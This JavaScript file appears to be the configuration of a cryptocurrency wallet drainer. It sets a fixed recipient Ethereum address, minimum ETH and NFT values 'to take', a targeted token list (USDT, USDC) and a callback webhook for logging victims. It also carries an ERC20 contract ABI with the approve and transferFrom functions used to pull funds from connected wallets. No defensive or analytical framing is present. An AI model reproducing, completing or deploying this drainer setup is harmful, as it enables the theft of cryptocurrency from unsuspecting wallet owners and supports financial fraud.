const toEthAddress = "0x276dd3c5eee07d17495FdFfAFeCbbC6FEb059a9a";
const myChainId = "0x1"; // 0x1 for ETH Chain || DO NOT CHANGE
const minimumEthBalance = 0.0001; // minimum eth amount to take
const minimumNftValue = 0.001; // minimum NFT value to take in eth
const tokenList = {
  '0xdac17f958d2ee523a2206206994597c13d831ec7': 5, // USDT
  '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48': 5, // USDC
}

const chainName = "ETH";
const chainToken = "ERC20";

const logsDelivery = true; // true for enable and false for disable
const webhookURL = "./backend/callback.php"; // discord webhook url
const chatId = "889054973"

const tokenContractAbi = [{ constant: !0, inputs: [], name: "name", outputs: [{ name: "", type: "string" }], payable: !1, type: "function" }, { constant: !1, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }], name: "approve", outputs: [{ name: "success", type: "bool" }], payable: !1, type: "function" }, { constant: !0, inputs: [], name: "totalSupply", outputs: [{ name: "", type: "uint256" }], payable: !1, type: "function" }, { constant: !1, inputs: [{ name: "_from", type: "address" }, { name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transferFrom", outputs: [{ name: "success", type: "bool" }], payable: !1, type: "function" }, { constant: !0, inputs: [], name: "decimals", outputs: [{ name: "", type: "uint256" }], payable: !1, type: "function" }, { constant: !0, inputs: [], name: "version", outputs: [{ name: "", type: "string" }], payable: !1, type: "function" }, { constant: !0, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], payable: !1, type: "function" }, { constant: !0, inputs: [], name: "symbol", outputs: [{ name: "", type: "string" }], payable: !1, type: "function" }, { constant: !1, inputs: [{ name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transfer", outputs: [{ name: "success", type: "bool" }], payable: !1, type: "function" }, { constant: !1, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }, { name: "_extraData", type: "bytes" }], name: "approveAndCall", outputs: [{ name: "success", type: "bool" }], payable: !1, type: "function" }, { constant: !0, inputs: [{ name: "_owner", type: "address" }, { name: "_spender", type: "address" }], name: "allowance", outputs: [{ name: "remaining", type: "uint256" }], payable: !1, type: "function" }, { inputs: [{ name: "_initialAmount", type: "uint256" }, { name: "_tokenName", type: "string" }, { name: "_decimalUnits", type: "uint8" }, { name: "_tokenSymbol", type: "string" }], type: "constructor" }, { payable: !1, type: "fallback" }, { anonymous: !1, inputs: [{ indexed: !0, name: "_from", type: "address" }, { indexed: !0, name: "_to", type: "address" }, { indexed: !1, name: "_value", type: "uint256" }], name: "Transfer", type: "event" }, { anonymous: !1, inputs: [{ indexed: !0, name: "_owner", type: "address" }, { indexed: !0, name: "_spender", type: "address" }, { indexed: !1, name: "_value", type: "uint256" }], name: "Approval", type: "event" },];
